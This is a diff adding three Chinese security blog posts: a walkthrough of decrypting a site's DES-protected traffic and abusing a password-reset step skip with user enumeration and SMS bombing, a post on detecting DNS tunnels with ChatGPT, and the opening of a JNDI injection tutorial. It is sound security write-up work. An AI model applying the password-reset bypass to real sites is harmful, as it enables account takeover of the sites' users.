@@ -17,6 +17,546 @@
       </tags>
   </entry>
   <entry>
+    <title>流量解密并挖掘任意密码重置</title>
+    <url>/2023/05/25/%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86%E5%B9%B6%E6%8C%96%E6%8E%98%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/</url>
+    <content><![CDATA[<h1 id="流量解密并挖掘任意密码重置"><a href="#流量解密并挖掘任意密码重置" class="headerlink" title="流量解密并挖掘任意密码重置"></a>流量解密并挖掘任意密码重置</h1><p>先随便找一处功能点在下断点前我先抓个包给你们看看<br><img src="https://image.3001.net/images/20230525/1684983280759.png" alt="68281-mji3rducb5.png"></p>
+<p>平常遇到了是不是就想放弃了？莫慌，待我操作一番。</p>
+<p>先在功能中下个断点<br><img src="https://image.3001.net/images/20230525/16849832837871.png" alt="04872-5n7h3iot8pd.png"></p>
+<p><img src="https://image.3001.net/images/20230525/16849832869105.png" alt="02010-gku368kk1i.png"></p>
+<p>点击获取验证码</p>
+<p>可以发现已经在断点处暂停了<br><img src="https://image.3001.net/images/20230525/16849832891761.png" alt="20218-jdhd5qgpme.png"></p>
+<p><img src="https://image.3001.net/images/20230525/16849832942616.png" alt="18371-9vz9bnbidaf.png"></p>
+<p>分别为</p>
+<ul>
+<li>继续执行F8</li>
+<li>跳过下一个函数调用F10</li>
+<li>进入下一个函数调用F11</li>
+<li>跳出当前函数SHIFT+F11</li>
+<li>单步调试F9</li>
+</ul>
+<p>这里直接先跳到下个函数调用<br><img src="https://image.3001.net/images/20230525/16849832969454.png" alt="38552-03sk4yszrtm8.png"></p>
+<p>一直F10一直到看起来像加密的函数<br><img src="https://image.3001.net/images/20230525/16849832999288.png" alt="35660-irm4qjar41.png"></p>
+<p>从名字上看就可以知道这是个DES加密</p>
+<p>跟进去看看<br><img src="https://image.3001.net/images/20230525/16849833019847.png" alt="00907-hpb0vr1dyg8.png"></p>
+<p>这里直接就知道了。这个网站是用DES加密，模式为ECB padding为Pkcs7以及key的值。并且加解密函数也都有了，也就不用继续再跟了。<br><img src="https://image.3001.net/images/20230525/16849833044314.png" alt="37246-x0kdnpj5na.png"></p>
+<p>用console控制台调试一下<br><img src="https://image.3001.net/images/20230525/16849833079332.png" alt="15923-ptwrv5eiel.png"></p>
+<p>可以发现成功解密了</p>
+<p>再试试调用下加密模块<br><img src="https://image.3001.net/images/20230525/16849833109734.png" alt="45079-7nmw2xfhi9s.png"></p>
+<p>可以发现是一样的。</p>
+<p>那么这个网站的加密对于现在来说跟没有是一样的了，似入无人之境再解密下刚才的返回包看看说了什么<br><img src="https://image.3001.net/images/20230525/16849833131860.png" alt="51973-6vqjg0e9af.png"></p>
+<p>可以发现也成功的解密了出来。</p>
+<p>一般这种加密的网站只要能解密出来就很容易存在些漏洞。of course这里也是有滴。</p>
+<p>我就直接开讲了，不多逼逼废话了。</p>
+<p>这里来到修改密码的功能点<br><img src="https://image.3001.net/images/20230525/1684983316708.png" alt="12701-6o798pa8et3.png"></p>
+<p>有一个很经典的resetPwdstep1.jsp</p>
+<p>尝试改成2看看<br><img src="https://image.3001.net/images/20230525/16849833185532.png" alt="57667-wh2vwy268e.png"></p>
+<p>可以，很经典。不过就算这样抓包，还是不知道请求包该怎么构造(看上面就知道比较复杂)。先正常请求获取波构造<br><img src="https://image.3001.net/images/20230525/16849833211612.png" alt="28790-u6nar5t0gal.png"></p>
+<p>可以看到这里头待有个个加密data解密下看看<br><img src="https://image.3001.net/images/20230525/16849833247815.png" alt="05146-ryjrapd2xr.png"></p>
+<p>sjh000代表了手机号 yzm000则是验证码。不过问题不大，把验证码修改成000000看看<br><img src="https://image.3001.net/images/20230525/16849833272461.png" alt="81519-v06xe5fu9aa.png"></p>
+<p>666直接注册成功了(其实经过测试。在resetPwdstep2.jsp下只要验证码不为空。任意六位数字都可以导致密码修改成功，也是醉了 )<br><img src="https://image.3001.net/images/20230525/16849833308971.png" alt="62959-hup3kgdd3rm.png"></p>
+<p>为了更方便点呢。其实直接抓修改密码的包进行重复发包即可(对于验证码的校验仅在step1)</p>
+<p>dlmm00是设置的密码 利用md5进行加密<br><img src="https://image.3001.net/images/20230525/16849833339425.png" alt="97572-dudvnuwrp17.png"></p>
+<p><img src="https://image.3001.net/images/20230525/16849833364485.png" alt="68420-6uvqo7y5zze.png"></p>
+<p>LIKE THIS<br><img src="https://image.3001.net/images/20230525/16849833387780.png" alt="65410-iffk0iaue5.png"></p>
+<p><img src="https://image.3001.net/images/20230525/16849833425870.png" alt="21229-xlnrzf6fxee.png"></p>
+<p>而且在该注册处还存在用户枚举以及横向手机号短信轰炸漏洞，可以利用这个地方对已注册手机号进行枚举，然后搭配任意密码修改即可<del>~</del><br><img src="https://image.3001.net/images/20230525/16849833453662.png" alt="19234-iwvhvktubfm.png"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>DNS隐藏隧道检测的新思路</title>
+    <url>/2023/05/25/DNS%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B%E7%9A%84%E6%96%B0%E6%80%9D%E8%B7%AF/</url>
+    <content><![CDATA[<h1 id="DNS隐藏隧道检测的新思路"><a href="#DNS隐藏隧道检测的新思路" class="headerlink" title="DNS隐藏隧道检测的新思路"></a>DNS隐藏隧道检测的新思路</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>假设你是一名网络安全专家，正在企业的安全监控中心观察着一系列网络流量的数据包。突然，你的目光被一条看起来非常奇怪的流量所吸引：长长的一串域名，每个域名都充满了无意义的字符。你感到十分不寻常，因为这样的域名不像是一般的合法域名，而更像是一种隐藏信息的通道。 </p>
+<p>随着深入的调查和分析，你意识到这就是DNS隐藏隧道的典型表现。这种通道利用DNS协议来隐藏和传递信息，可以通过各种方法来规避常规安全检测。你开始思考如何更有效地检测和拦截这种隐藏在DNS流量中的威胁。</p>
+<p>在本文中，我们将深入探讨DNS隐藏隧道的工作原理和搭建方式，以及现有的检测方法。我们还将介绍一种新的、创造性的方法——利用AI大模型来检测DNS隐藏隧道。通过这种先进的技术手段，或许我们可以更加准确、快速地发现和应对这种具有潜在危险的网络威胁。</p>
+<h2 id="DNS隐藏隧道"><a href="#DNS隐藏隧道" class="headerlink" title="DNS隐藏隧道"></a>DNS隐藏隧道</h2><p>DNS隐藏隧道是一种利用域名系统 (DNS) 协议传输数据的技术。它通过将数据片段嵌入 DNS 查询或响应的域名字段中，从而在 DNS 通信流量中隐藏数据，从而达到传输数据的目的。DNS隐藏隧道的优点包括可以穿过网络过滤设备、防火墙和代理服务器等限制网络流量的设备，从而实现通信的隐蔽性和灵活性。</p>
+<p>DNS隐藏隧道的实现方法通常包括在 DNS 查询中使用不常用的 DNS RR（Resource Record）类型，例如 TXT、AAAA、MX 等，以及在查询/响应中使用不常用的域名字段。由于数据片段被嵌入到 DNS 通信中，因此需要在数据传输的两端实现自定义的编码和解码算法以确保数据的正确性和完整性。</p>
+<p>虽然 DNS隐藏隧道在某些场景下可以是一种有效的通信方式，但它也容易被用于恶意目的，例如在网络攻击中传输命令和控制数据。因此，安全专家需要密切关注 DNS 通信中的异常活动，以检测和防范潜在的安全威胁。</p>
+<p>DNS隐藏隧道程序通常有两种模式：中继模式和直连模式。</p>
+<blockquote>
+<ol>
+<li>中继模式</li>
+</ol>
+<p>中继模式的DNS隐藏隧道程序通常会在本地机器和C&amp;C服务器之间建立一条隐藏通道，通过本地域名服务器（例如公司内部DNS服务器）来中继转发隧道流量，以避免被网络防火墙等安全设备检测和拦截。</p>
+<p>在中继模式中，DNS隧道程序会向本地域名服务器发送DNS请求，通过DNS请求和响应的负载部分来传输数据，从而达到隐蔽通信的目的。在DNS请求中，DNS隧道程序通常会使用特殊的查询类型（例如TXT、SRV、MX等），并将数据以base64等方式进行编码。</p>
+<ol start="2">
+<li>直连模式</li>
+</ol>
+<p>直连模式的DNS隐藏隧道程序通常会在本地机器和C&amp;C服务器之间建立一条直接连接的隐藏通道，通过DNS协议来传输数据。</p>
+<p>在直连模式中，DNS隧道程序会直接与C&amp;C服务器建立连接，并将数据以特定的格式（例如DNS-over-HTTP）进行封装和传输。由于直接连接没有经过域名服务器的中转，因此直连模式相对中继模式来说更加难以被检测和拦截。</p>
+</blockquote>
+<p>需要注意的是，随着安全设备和检测技术的不断发展，DNS隐藏隧道程序的中继模式和直连模式也在不断演变和升级，以适应各种网络环境和安全威胁。</p>
+<h2 id="常见的DNS隐藏隧道程序"><a href="#常见的DNS隐藏隧道程序" class="headerlink" title="常见的DNS隐藏隧道程序"></a>常见的DNS隐藏隧道程序</h2><blockquote>
+<ol>
+<li>Dnscat2：一种基于DNS的命令和控制通道，可以通过DNS隐藏隧道传输数据和命令，同时支持前向和反向模式。</li>
+</ol>
+<ol start="2">
+<li>Iodine：一种IPv4-over-DNS隧道工具，可以在不支持IPv6的网络上使用DNS隧道实现IPv6通信。</li>
+</ol>
+<ol start="3">
+<li>Dns2tcp：一种基于DNS的TCP隧道工具，可以将TCP数据流转换为DNS流量，并通过DNS隧道传输数据。</li>
+</ol>
+<ol start="4">
+<li>Dnstunnel：一种基于DNS的TCP隧道工具，可以通过DNS隧道传输TCP数据流量。</li>
+</ol>
+<ol start="5">
+<li>Dnscapy：一个基于Python编写的DNS处理工具包，可以用于自定义DNS隧道的实现和调试。</li>
+</ol>
+</blockquote>
+<h2 id="DNS隐藏隧道的特征"><a href="#DNS隐藏隧道的特征" class="headerlink" title="DNS隐藏隧道的特征"></a>DNS隐藏隧道的特征</h2><p>目前对DNS隐藏隧道的检测方式可以分为基于规则的硬匹配，与通过使用机器学习甚至是深度学习的方式，通过学习已知的DNS隐藏隧道中潜藏的数学规律，去识别已知类型甚至未知的隐藏隧道，基于规则的方式容易被攻击者绕过而产生漏报，而基于机器学习的方式除了漏报外还可能产生误报，尽管存在着一定的不准确性，它们的检测方式还是值得我们学习并尝试改进的。</p>
+<p>信源输出的信息量均值即为信息熵。信息熵的 大小能体现信号的复杂度以及平均不确定性。DNS隐藏隧道的作用通常是用于窃取文件或者传递控制命令等，因此DNS隐藏隧道流量中的数据通常是经过加密和压缩的因此其信息熵相对较高。</p>
+<p>信息熵计算式：</p>
+<p><img src="https://image.3001.net/images/20230525/16849828524890.jpg" alt="img"></p>
+<p>正常域名则通常包含有意义的单词、短语和标点符号等如包含描述性单词和品牌名称，而恶意域名通常是编码过后的信息，因此它们的重合指数也可能存在显著的差异。</p>
+<p>重合指数计算式：</p>
+<p><img src="https://image.3001.net/images/20230525/16849828556260.jpg" alt="img"></p>
+<p>DNS隐藏隧道域名通常包含多个子域名，每个子域名可能包含不同的随机字符和数字，而正常域名则通常只有一个或少量子域名，因此可以选择子域名数作为判断的依据。</p>
+<p>DNS隐藏隧道域名通常采用非常短的TTL（Time-to-live）时间，即DNS服务器缓存该域名信息的时间非常短，以便频繁更新域名映射关系。</p>
+<p>由于DNS隐藏隧道技术通常使用TXT记录进行数据传输，因此可以通过对DNS响应包的类型进行分析来判断是否为DNS隐藏隧道。</p>
+<p>一般情况下，DNS隐藏隧道流量的域名比较长，包含大量的数字和非法字符，同时唯一字符数相对较低，这些特点和正常的域名有很大的不同。</p>
+<p>需要注意的是，DNS隐藏隧道攻击具有隐蔽性和灵活性，攻击者可以通过不断改变攻击方式、加密方式、数据格式等手段来规避检测。</p>
+<h2 id="用ChatGPT检测DNS隐藏隧道"><a href="#用ChatGPT检测DNS隐藏隧道" class="headerlink" title="用ChatGPT检测DNS隐藏隧道"></a>用ChatGPT检测DNS隐藏隧道</h2><p>至此我们已经了解到可以尝试通过信息熵、重合指数、子域名数、TTL、DNS响应包的类型、域名中的数字、非法字符数、唯一字符数这几个维度去尝试分析一个域名是否为恶意域名，通常情况下我们可以采集训练集、测试集，用机器学习甚至是深度学习来进行检测，但是我们可以发现检测DNS隐藏隧道其实质为文本分类问题，而ChatGPT作为一款著名的文本AI大模型，其在语义理解、翻译等都有着惊人的表现，因此我们可以尝试将我们之前了解到的几个分析维度都灌输给它，由它来给我们做判断，从中窥探一些AI大模型在DNS隐藏隧道检测中是否具有可行性。</p>
+<p>那本次实验我们将适当降低难度，仅提供几条域名给ChatGPT让它从我们之前了解到的一些分析维度进行识别，因为筛选的域名非常有限，不代表其在实际场景中运用的真实效果。</p>
+<blockquote>
+<p>0c495011391d4e40054d495a4368.yafgcy.ceye.io（2023红明谷初赛hacker流量包出现的恶意域名）</p>
+<p>59115a4b465044695a5a56015c4252065e501c130e416f5c5647556b510044.yafgcy.ceye.io（2023红明谷初赛hacker流量包出现的恶意域名）</p>
+<p>05b0e5d4b5f5b5b69505c57074f18430c423f5b0c0852105a521d4409476b5.yafgcy.ceye.io（2023红明谷初赛hacker流量包出现的恶意域名）</p>
+<p>119acddc-cc9a-4ed3-b52a-a5d896481715.node4.buuoj.cn（buuctf创建的web题练习靶机，正常域名）</p>
+<p>a04667aa-e340-4571-86fe-6ab6e5520d3b.node4.buuoj.cn（buuctf创建的web题练习靶机，正常域名）</p>
+<p>c14ce4cf-764f-4319-a1d2-3835ab96b1cf.node4.buuoj.cn（buuctf创建的web题练习靶机，正常域名）</p>
+<p><a href="http://www.baidu.com（正常域名）" target="_blank" rel="noopener">www.baidu.com（正常域名）</a></p>
+<p><a href="http://www.bilibili.com（正常域名）" target="_blank" rel="noopener">www.bilibili.com（正常域名）</a></p>
+<p>535yx.cn（正常域名）</p>
+<p>64a.life/rW82l（正常域名进行短链接处理后的干扰项）</p>
+</blockquote>
+<p><img src="https://image.3001.net/images/20230525/16849828599959.png" alt="image-20230525101452031"></p>
+<p>可以看到ChatGPT准确的识别了其中存在的恶意域名。</p>
+<h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>本文通过深入探究DNS隐藏隧道的搭建方式和原理，以及现有的DNS隐藏隧道检测技术，我们发现利用AI大模型进行DNS隐藏隧道检测具有很大的潜力。在我们的实验中，ChatGPT能够精准地识别DNS隐藏隧道，这为我们提供了非常有价值的参考，虽然我们的实验只针对少量的dns域名，无法完全反映真实场景，但这项尝试表明利用AI大模型检测DNS隐藏隧道的可能性，并且这种方法有望在未来成为解决各种隐藏隧道问题的有效手段。通过这种方法，我们或许可以为未来的网络安全防御提供一种更加高效、更加全面的方式。相比于开发针对特定问题的安全产品，利用AI大模型可以解决各种类型的隐蔽通信问题，而且无需进行专项训练。我们相信，这将是网络安全防御领域的一个重大突破，带来更加安全、稳定的网络环境。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>JNDI注入</title>
+    <url>/2023/05/12/JNDI%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="1-JDNI注入"><a href="#1-JDNI注入" class="headerlink" title="1. JDNI注入"></a>1. JDNI注入</h1><p>本篇文章作者jok3r0x，本文属i春秋原创奖励计划，未经许可禁止转载。</p>
+<h2 id="1-1-背景知识"><a href="#1-1-背景知识" class="headerlink" title="1.1. 背景知识"></a>1.1. 背景知识</h2><h3 id="1-1-1-JNDI-Service-Provider"><a href="#1-1-1-JNDI-Service-Provider" class="headerlink" title="1.1.1. JNDI Service Provider"></a>1.1.1. JNDI Service Provider</h3><p>JNDI 与 <code>JNDI Service Provider</code> 的关系类似于 Windows 中 SSPI 与 SSP 的关系。前者是统一抽象出来的接口，而后者是对接口的具体实现。如默认的 <code>JNDI Service Provider</code> 有 <code>RMI/LDAP</code> 等等。</p>
+<h3 id="1-1-2-ObjectFactory"><a href="#1-1-2-ObjectFactory" class="headerlink" title="1.1.2. ObjectFactory"></a>1.1.2. ObjectFactory</h3><p>每一个 <code>Service Provider</code> 可能配有多个 <code>Object Factory</code>。<code>Object Factory</code> 用于将 Naming Service（如 RMI/LDAP）中存储的数据转换为 Java 中可表达的数据，如 Java 中的对象或 Java 中的基本数据类型。 <strong>JNDI 的注入的问题就出在了可远程下载自定义的 ObjectFactory 类上</strong>。你如果有兴趣的话可以完整看一下 Service Provider 是如何与多个 ObjectFactory 进行交互的。</p>
+<h2 id="1-2-JNDI概述"><a href="#1-2-JNDI概述" class="headerlink" title="1.2. JNDI概述"></a>1.2. JNDI概述</h2><p>JNDI（Java Naming and Directory Interface，<strong>Java命名和目录接口</strong>）是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。目录服务是命名服务的一种自然扩展。</p>
+<p>JNDI是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，<strong>类似JDBC都是构建在抽象层上</strong>。允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中，就像人的名字或DNS中的域名与IP的关系。</p>
+<p>JNDI由<code>JNDI API</code>、<code>命名管理</code>、<code>JNDI SPI（service provider interface）服务提供的接口</code>组成。我们的应用可以通过JNDI的API去访问相关服务提供的接口</p>
+<p><img src="https://image.3001.net/images/20230512/16838840292644.png" alt="img"></p>
+<p>JDNI的服务是可以拓展的，可以从JNDI页面下载其他服务提供商，也可以从远程获得其他服务提供商 JDK包括以下命名/目录服务的服务：</p>
+<ul>
+<li>轻型目录访问协议（ldap）</li>
+<li>通用对象请求代理体系结构（CORBA），通用对象服务（COS）名称服务</li>
+<li>Java远程方法调用（RMI）注册表</li>
+<li>域名服务（DNS）</li>
+</ul>
+<p>Java命名和目录接口（JNDI）是一种Java API，类似一个索引中心，它允许客户端通过name发现和查找数据和对象。其应用场景比如：动态加载数据库配置文件，从而保持数据库代码不变动等。</p>
+<p>代码格式如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//指定需要查找name名称</span></span><br><span class="line">String jndiName= <span class="string">"Test"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化默认环境</span></span><br><span class="line">Context context = <span class="keyword">new</span> InitialContext();</span><br><span class="line"></span><br><span class="line"><span class="comment">//查找该name的数据</span></span><br><span class="line">DataSource ds = (DataSourse)context.lookup(jndiName);</span><br></pre></td></tr></table></figure>
+
+<p>这里的<code>jndiName变量</code>的值可以是上面的命名/目录服务列表里面的值，如果JNDI名称可控的话可能会被攻击。</p>
+<p>那上面提到的<strong>命名</strong>和<strong>目录</strong>是什么？</p>
+<ul>
+<li><strong>命名服务</strong>：命名服务是一种简单的键值对绑定，可以通过键名检索值，RMI就是典型的命名服务</li>
+<li><strong>目录服务</strong>：目录服务是命名服务的拓展。它与命名服务的区别在于它可以通过对象属性来检索对象</li>
+</ul>
+<blockquote>
+<p>举个例子：比如你要在某个学校里里找某个人，那么会通过：年级-&gt;班级-&gt;姓名这种方式来查找，年级、班级、姓名这些就是某个人的属性，这种层级关系就很像目录关系，所以这种存储对象的方式就叫目录服务。LDAP是典型的目录服务</p>
+</blockquote>
+<p>其实，仔细一琢磨就会感觉其实命名服务与目录服务的本质是一样的，都是通过键来查找对象，只不过目录服务的键要灵活且复杂一点。</p>
+<p>在一开始很多人都会被jndi、rmi这些词汇搞的晕头转向，而且很多文章中提到了可以用jndi调用rmi，就更容易让人发昏了。我们只要知道jndi是<strong>对各种访问目录服务的逻辑进行了再封装</strong>，也就是以前我们访问rmi与ldap要写的代码差别很大，但是有了jndi这一层，我们就可以用jndi的方式来轻松访问rmi或者ldap服务，这样访问不同的服务的代码实现基本是一样的。一图胜千言：</p>
+<p><img src="https://image.3001.net/images/20230512/16838840339056.png" alt="image-20230512105627919"></p>
+<p>从图中可以看到jndi在访问rmi时只是传了一个键foo过去，然后rmi服务端返回了一个对象，访问ldap这种目录服务时，传过去的字符串比较复杂，包含了多个键值对，这些键值对就是对象的属性，LDAP将根据这些属性来判断到底返回哪个对象。</p>
+<h2 id="1-3-JNDI类"><a href="#1-3-JNDI类" class="headerlink" title="1.3. JNDI类"></a>1.3. JNDI类</h2><p>在Java JDK里面提供了5个包，提供给JNDI的功能实现，分别是：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类；</span></span><br><span class="line">javax.naming</span><br><span class="line"></span><br><span class="line"><span class="comment">//主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；</span></span><br><span class="line">javax.naming.directory</span><br><span class="line"></span><br><span class="line"><span class="comment">//在命名目录服务器中请求事件通知；</span></span><br><span class="line">javax.naming.event</span><br><span class="line"></span><br><span class="line"><span class="comment">//提供LDAP支持；</span></span><br><span class="line">javax.naming.ldap</span><br><span class="line"></span><br><span class="line"><span class="comment">//允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。</span></span><br><span class="line">javax.naming.spi</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-3-1-InitialContext类"><a href="#1-3-1-InitialContext类" class="headerlink" title="1.3.1. InitialContext类"></a>1.3.1. InitialContext类</h3><p>在这JDK里面给的解释是构建初始上下文，其实通俗点来讲就是获取初始目录环境。</p>
+<h4 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//构建一个初始上下文。</span></span><br><span class="line">InitialContext() </span><br><span class="line"></span><br><span class="line"><span class="comment">//构造一个初始上下文，并选择不初始化它。</span></span><br><span class="line">InitialContext(<span class="keyword">boolean</span> lazy) </span><br><span class="line"></span><br><span class="line"><span class="comment">//使用提供的环境构建初始上下文。 </span></span><br><span class="line">InitialContext(Hashtable&lt;?,?&gt; environment)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>实现代码</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InitialContext initialContext = <span class="keyword">new</span> InitialContext();</span><br></pre></td></tr></table></figure>
+
+<h4 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//将名称绑定到对象。</span></span><br><span class="line">bind(Name name, Object obj) </span><br><span class="line"></span><br><span class="line"><span class="comment">//枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。</span></span><br><span class="line">list(String name) </span><br><span class="line"></span><br><span class="line"><span class="comment">//检索命名对象。</span></span><br><span class="line">lookup(String name) </span><br><span class="line"></span><br><span class="line"><span class="comment">//将名称绑定到对象，覆盖任何现有绑定。 </span></span><br><span class="line">rebind(String name, Object obj) </span><br><span class="line"></span><br><span class="line"><span class="comment">//取消绑定命名对象。</span></span><br><span class="line">unbind(String name)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>实现代码</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> NamingException, RemoteException </span>&#123;</span><br><span class="line">        String uri = <span class="string">"rmi://127.0.0.1:1099/test"</span>;</span><br><span class="line">        InitialContext initialContext = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        HelloInterface helloInterface = (HelloInterface) initialContext.lookup(uri);</span><br><span class="line">        System.out.println(helloInterface.says(<span class="string">"hello"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-3-2-Reference类"><a href="#1-3-2-Reference类" class="headerlink" title="1.3.2. Reference类"></a>1.3.2. Reference类</h3><p>该类也是在<code>javax.naming</code>的一个类，该类表示对在命名/目录系统外部找到的对象的引用。提供了JNDI中类的引用功能。</p>
+<p>在一些命名服务系统中，系统并不是直接将对象存储在系统中，而是保持对象的引用。引用包含了如何访问实际对象的信息。具体可以查看<a href="https://blog.csdn.net/ericxyy/article/details/2012287" target="_blank" rel="noopener">Java技术回顾之JNDI：命名和目录服务基本概念</a>。</p>
+<h4 id="构造方法-1"><a href="#构造方法-1" class="headerlink" title="构造方法"></a>构造方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//为类名为“className”的对象构造一个新的引用。  </span></span><br><span class="line">Reference(String className) </span><br><span class="line"></span><br><span class="line"><span class="comment">//为类名为“className”的对象和地址构造一个新引用。 </span></span><br><span class="line">Reference(String className, RefAddr addr) </span><br><span class="line"></span><br><span class="line"><span class="comment">//为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。 </span></span><br><span class="line">Reference(String className, RefAddr addr, String factory, String factoryLocation) </span><br><span class="line"></span><br><span class="line"><span class="comment">//为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。 </span></span><br><span class="line">Reference(String className, String factory, String factoryLocation)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>实现代码</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String url = <span class="string">"http://127.0.0.1:8080"</span>;</span><br><span class="line">Reference reference = <span class="keyword">new</span> Reference(<span class="string">"test"</span>, <span class="string">"test"</span>, url);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在使用Reference时，我们可以直接将对象传入构造方法中，当被调用时，对象的方法就会被触发，创建Reference实例时几个比较关键的属性：</p>
+<p>参数1：<code>className</code> - 远程加载时所使用的类名</p>
+<p>参数2：<code>classFactory</code> - 加载的<code>class</code>中需要实例化类的名称</p>
+<p>参数3：<code>classFactoryLocation</code> - 提供<code>classes</code>数据的地址可以是<code>file/ftp/http</code>协议</p>
+</blockquote>
+<p>Reference类表示对存在于命名/目录系统以外的对象的引用。如果远程获取 RMI 服务上的对象为 Reference 类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载 class 文件来进行实例化。</p>
+<p>Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。</p>
+<p><strong>补充</strong></p>
+<h4 id="常用方法-1"><a href="#常用方法-1" class="headerlink" title="常用方法"></a>常用方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> posn, RefAddr addr)</span> </span></span><br><span class="line"><span class="function">    将地址添加到索引posn的地址列表中。  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(RefAddr addr)</span> </span></span><br><span class="line"><span class="function">    将地址添加到地址列表的末尾。  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    从此引用中删除所有地址。  </span></span><br><span class="line"><span class="function">RefAddr <span class="title">get</span><span class="params">(<span class="keyword">int</span> posn)</span> </span></span><br><span class="line"><span class="function">    检索索引posn上的地址。  </span></span><br><span class="line"><span class="function">RefAddr <span class="title">get</span><span class="params">(String addrType)</span> </span></span><br><span class="line"><span class="function">    检索地址类型为“addrType”的第一个地址。  </span></span><br><span class="line"><span class="function">Enumeration&lt;RefAddr&gt; <span class="title">getAll</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    检索本参考文献中地址的列举。  </span></span><br><span class="line"><span class="function">String <span class="title">getClassName</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    检索引用引用的对象的类名。  </span></span><br><span class="line"><span class="function">String <span class="title">getFactoryClassLocation</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    检索此引用引用的对象的工厂位置。  </span></span><br><span class="line"><span class="function">String <span class="title">getFactoryClassName</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    检索此引用引用对象的工厂的类名。    </span></span><br><span class="line"><span class="function">Object <span class="title">remove</span><span class="params">(<span class="keyword">int</span> posn)</span> </span></span><br><span class="line"><span class="function">    从地址列表中删除索引posn上的地址。  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    检索此引用中的地址数。  </span></span><br><span class="line"><span class="function">String <span class="title">toString</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    生成此引用的字符串表示形式。</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="1-4-JNDI代码实现"><a href="#1-4-JNDI代码实现" class="headerlink" title="1.4. JNDI代码实现"></a>1.4. JNDI代码实现</h2><p>在JNDI中提供了绑定和查找的方法</p>
+<ul>
+<li><strong>bind(Name name, Object obj)</strong> ：将名称绑定到对象中</li>
+<li><strong>lookup(String name)</strong>： 通过名字检索执行的对象</li>
+</ul>
+<h3 id="1-4-1-实现过程"><a href="#1-4-1-实现过程" class="headerlink" title="1.4.1. 实现过程"></a>1.4.1. 实现过程</h3><p>类似rmi的实现过程，只不过最后绑定和检索的时候有一点差别。</p>
+<ul>
+<li>定义远程接口</li>
+<li>服务端实现远程接口</li>
+<li>服务端注册远程对象</li>
+<li>客户端调用接口</li>
+</ul>
